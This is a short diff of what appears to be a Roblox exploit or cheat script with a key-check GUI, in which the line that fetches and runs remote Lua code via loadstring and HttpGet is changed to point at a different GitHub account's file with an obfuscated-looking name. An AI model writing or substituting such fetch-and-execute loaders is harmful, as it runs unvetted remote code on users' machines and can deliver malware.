@@ -137,7 +137,7 @@ local function validateKey()
     end
 
     if isValid then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Ertuxrq/idk/main/idk.lua"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/c00kiesmasher/idkwhoisthis/main/lIlIlIlIlIlIlIlI.lua"))()
 		GUI.Visible = false
 		OrionLib:MakeNotification({
             Name = "Key Doğrulandı!",
